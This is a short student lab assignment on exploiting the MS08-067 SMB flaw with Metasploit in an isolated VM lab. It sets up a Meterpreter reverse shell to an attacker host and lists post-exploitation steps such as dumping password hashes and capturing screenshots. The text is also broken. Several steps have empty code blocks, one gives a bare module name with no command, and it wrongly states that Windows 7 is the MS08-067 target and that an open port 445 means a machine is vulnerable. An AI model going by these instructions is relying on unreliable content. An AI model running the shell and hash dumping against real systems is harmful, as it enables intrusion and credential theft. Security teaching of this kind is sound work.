## **Lab Assignment: Exploiting MS08-067 with Metasploit**

### **Objective**
Use Metasploit to exploit the **MS08-067 NetAPI vulnerability** on a vulnerable Windows 7 machine and gain a Meterpreter shell.



### **Steps**

**1. Lab Setup**

* Ensure you have:

  * **Kali Linux (attacker machine)** with `msfconsole` installed.
  * **Windows 7 vulnerable VM** (unpatched, with vulnerable `netapi32.dll`).
* Use **Host-Only Network** or **NAT Network** in VirtualBox/VMware for isolation.
* Confirm attacker and victim VMs are on the same network (`ifconfig` / `ipconfig`).



**2. Verify the Target is Alive**
On Kali, run:




**3. Scan the Target with Nmap**
Check if SMB (port 445) is open:



If port **445/tcp open** → the target is vulnerable to SMB exploits.



**4. Start Metasploit**




**5. Load the Exploit Module**

```bash
ms08_067_netapi
```


**6. Configure the Target (Victim)**

```bash
set RHOSTS <target-ip>
```



**7. Configure the Payload**
Choose a reverse shell payload:

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
```


**8. Launch the Exploit**

```bash
exploit
```

If successful, you’ll get a **Meterpreter session**.


**9. Post-Exploitation Activities**
Inside the Meterpreter shell, try:

```bash
sysinfo          # Check system details
getuid           # Get current user
hashdump         # Dump password hashes (if allowed)
screenshot       # Take a screenshot of the victim’s desktop
```


**10. Reporting Requirement**
Each student should submit a short **lab report** containing:

* Screenshot of **Nmap scan results** (port 445 open).
* Screenshot of **msfconsole running the exploit**.
* Screenshot of **Meterpreter session** (`sysinfo` or `getuid`).
* A reflection: *“Why was MS08-067 such a critical vulnerability?”*

